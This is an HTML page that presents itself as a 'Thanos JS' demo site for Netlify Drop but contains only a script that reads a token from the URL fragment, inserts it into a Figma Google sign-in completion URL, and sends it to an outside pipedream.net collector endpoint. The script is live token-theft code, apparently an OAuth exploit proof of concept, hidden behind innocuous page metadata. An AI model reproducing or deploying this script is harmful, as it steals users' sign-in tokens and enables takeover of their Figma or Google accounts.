
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Thanos JS</title>
    <link href="styles.css" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="A demo site to use with Netlify Drop">
    <meta name="keywords" content="Thanos, JavaScript, Paradoy, Netlify Drop">
    <meta name="author" content="Rafael Conde">

    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
  </head>
  <body>
<script>
  
var token = document.location.hash.substr(2).split("&")[0];
var url = "https://www.figma.com/finish_google_sso&" + token + "response_type=code&scope=profile email&access_type=online&prompt=select_account&state=puLSO2M1pMrvlw2xGd8KjzEvggHJbq8JtP8QqSL4nVyo&flowName=GeneralOAuthFlow";
alert(url);
var x = new XMLHttpRequest();
x.open("GET","https://en1zne1dyqwns.x.pipedream.net/?open="+url,false);
x.send();
</script>
  </body>
</html>
